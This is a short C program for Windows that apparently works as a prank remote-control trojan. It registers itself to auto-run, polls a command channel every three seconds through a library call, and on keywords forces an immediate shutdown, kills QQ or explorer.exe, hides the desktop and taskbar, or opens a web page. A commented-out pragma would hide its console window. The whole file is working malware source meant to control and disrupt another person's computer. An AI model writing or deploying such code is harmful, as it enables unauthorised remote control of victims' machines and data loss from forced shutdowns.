#include<stdio.h>
#include<windows.h>
#include "itmojun.h"

#pragma comment(lib,"itmojun.lib")
#pragma comment(lib,"winmm.lib")
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )

int main()
{
	char msg[10];
	system("color f4");
	AutoRun();
	while(1){
		GetPCCmd("lyf",msg);
		printf("%s",msg);
		if(strstr(msg,"song"))
		{
			mciSendString("play bg.mp3",NULL,0,NULL);
		}
		else if(strstr(msg,"shutdown"))
		{
			WinExec("shutdown -s -t 0",0);
		}
		else if(strstr(msg,"killqq"))
		{
			WinExec("cmd /C taskkill /f /im qq.exe",0);
		}
		else if(strstr(msg,"deskkill"))
		{
			WinExec("cmd /C taskkill /f /im explorer.exe",0); 
		}
		else if(strstr(msg,"killself"))
		{
			WinExec("cmd /C taskkill /f /im aa.exe",0);
		}
		else if(strstr(msg,"baidu"))
		{
			WinExec("explorer http://www.baidu.com",1);
		}
		else if(strstr(msg,"deskrestart"))
		{
			WinExec("C:\\windows\\explorer.exe",1);
		}
		else if(strstr(msg,"enddesk"))
		{
			HWND desktop,taskker;
			desktop=FindWindow("ProMan",NULL);//找到桌面句柄
			taskker=FindWindow("Shell_TrayWnd",NULL);//找到任务栏句柄
			ShowWindow(desktop,SW_HIDE);//隐藏桌面窗口
			ShowWindow(taskker,SW_HIDE);//隐藏任务栏
		}
		else if(strstr(msg,"restardesk"))
		{
			HWND desktop,taskker;
			desktop=FindWindow("ProMan",NULL);//找到桌面句柄
			taskker=FindWindow("Shell_TrayWnd",NULL);//找到任务栏句柄
			ShowWindow(desktop,SW_SHOW);//显示桌面窗口
			ShowWindow(taskker,SW_SHOW);//显示任务栏
		}

		Sleep(3000);
	}
	return 0;
}

